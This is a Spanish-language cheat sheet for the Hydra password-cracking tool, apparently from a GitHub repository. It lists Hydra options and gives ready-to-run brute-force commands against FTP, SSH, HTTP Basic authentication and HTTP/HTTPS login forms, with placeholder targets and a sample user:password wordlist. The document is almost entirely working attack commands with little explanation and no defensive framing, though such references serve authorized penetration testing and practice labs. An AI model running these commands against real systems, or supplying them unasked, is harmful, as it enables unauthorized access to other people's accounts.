# Hydra Cheat Sheet

## Opciones

- `-s <port>` : Si el servicio está en un puerto diferente por default.
- `-l` : Especificar un usuario.
- `-L <userfile>` : Leer de un archivo listado de usuarios.
- `-p` : Especificar un password.
- `-P <passwordfile>` : Leer de un archivo listado de passwords.
- `-f` : Detener el ataque al encontrar una coincidencia.
- `-t <#tasks>`: Número de conecciones en paralelo por objetivo.
- `-M <targetsfile>` : Leer de un archivo listado de objetivos.
- `-o <file>` : Guargar el resultado en un archivo.
- `-vV` : Modo verbose, mostrando el inicio de sesión+contraseña para cada intento

#### Conocer los tipos de servicios que se pueden atacar
```
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
```

## Ejemplos

#### Cracking con Brute Force en FTP Server
```
hydra -t 1 -l admin -P <PATH-TO-PASSWORD.lst> -vV <IP-ADDRESS> ftp
```

#### Cracking con Brute Force en SSH Server
```
hydra -l msfadmin -P <PATH-TO-PASSWORD.lst> -vV <IP-ADDRESS> ssh
```

#### Fuerza bruta usando una wordlist para usuarios y otra para contraseñas e intentar que pase la contraseña en cada usuario de la lista
```
hydra -L <PATH-TO-USER.lst> -P <PATH-TO-PASSWORD.lst> -u -f <IP-ADDRESS> -s <PORT> http-get
```

#### Cracking con Brute Force a un formulario de inicio de sesión por HTTPS (La data de POST esta separada con el ':') y usando un mensaje de password incorrecto
```
hydra -l none -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:F=Incorrect password" -t 64

# Estructura de la data:
/login.php:<USER-PARAMETER>=^USER^&<PASSWORD-PARAMETER>=^PASS^:[F/S]=<FAILED/SUCCESS-STRING>
```

#### Fuerza bruta a un formulario de inicio de sesion por HTTP donde al ingresar una contraseña mal regresa al mismo formulario y eso usarlo como mensaje incorrecto
```
hydra -l admin -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> -s <PORT> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

#### Ataque de Fuerza Bruta a una Authenticacion Basica
```
hydra -l admin -P <PATH-TO-PASSWORD.lst> -s <PORT> -f <IP-ADDRESS> http-get
```

#### Cracking con Brute Force en WEB Login Server, enviando 'usuario:password'
```
hydra -C <WORDLIST-WITH-COLON-SEPARATED-FORMAT> <IP-ADDRESS> https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

Archivo credentials.txt:
albert:password
juan:mypassword
beto:qwerty
.
.
.
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)